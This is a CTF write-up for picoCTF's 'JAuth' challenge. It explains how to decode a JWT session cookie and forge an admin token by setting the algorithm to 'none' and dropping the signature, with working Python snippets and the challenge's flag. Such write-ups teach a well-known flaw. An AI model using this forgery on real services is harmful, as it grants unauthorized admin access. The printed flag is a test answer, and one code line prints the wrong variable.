---
title: "JAuth"
tags:
- Authentication Bypass
- CTF
- JWT
- PicoCTF
- Web
date: 2022-02-22T14:49:34+05:30
draft: false
---

The challenge description states that most web application developers use third party components without testing their security.
It mentions some past affected companies, then asks us to identify and exploit the vulnerable component for the challenge at http://saturn.picoctf.net:52025/

The goal is to become an `admin`.
We are provied with the username `test` and the password `Test123!` to look around.

The challenge is a dummy bank portal. On login, we see the message:
> Hello, You have logged in the testing page. There is nothing to see here.

While logging in, if we check the network requests and responses,
we can see a cookie named `token` being set.

```none
Set-Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjQ1NTE4MjkzMTE5LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6OTcuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85Ny4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2NDU1MTgyOTN9.dy45xnUb62Xnhqgo51JmGWRthAUGS-3jKwQ_RlDYCrw; path=/; httponly
```

On closer inspection, the cookie looks like a [JWT](@ "JSON Web Token").
[JWTs](https://en.wikipedia.org/wiki/JSON_Web_Token) comprise three base64 encoded parts, each separated by a dot:
- Header
- Payload
- Verification signature

> We can make this educated guess since the value begins with `eyJ` which partially decodes to `{"`

Let's try to decode the first two parts. I'll use python for this.

```python
from base64 import b64decode, b64encode
cookie = "eyJ0e..." # replace this with the entire cookie
header, payload = [b64decode(part).decode() for part in cookie.split('.')[:2]]
print(header)
# {"typ":"JWT","alg":"HS256"}
print(cookie)
# {"auth":1645518293119,"agent":"Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
# "role":"user", "iat":1645518293}
```

Decoding the signature would result in non-printable characters since it is
the base64 representation of the [HS256](@ "HMAC SHA256") digest of the header,
payload and a 256 bit secret. Other algorithms include [RSA256](@ "RSA SHA256") and
[ES256](@ "ECDSA SHA256").

To forge an admin's cookie, we would need to modify the `"role"` field in the
payload to `"admin"`. Doing so tampers the verification signature and we would
need the 256 bit secret to generate a valid signature.

Luckily, we see that the verification algorithm is specified in the cookie's header.
We can modify the `"alg"` field of the header to `"none"` and omit the verification signature completely.

```python
forged = [
 header.replace("HS256", "none"), # header
 payload.replace("user", "admin"), # payload
 "", # empty signature
]
encoded = [b64encode(part.encode()).decode() for part in forged]
print('.'.join(encoded))
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZ2VudCI6Ik1vemlsbGE...
```

This python snippet gives us the forged cookie. Do not forget the trailing dot while copying.
Setting the cookie to this value, we are redirected to the admin page.

> Hello, admin! You have logged in as admin!

and we are greeted with the flag `picoCTF{succ3ss_@u7h3nt1c@710n_57072644}`
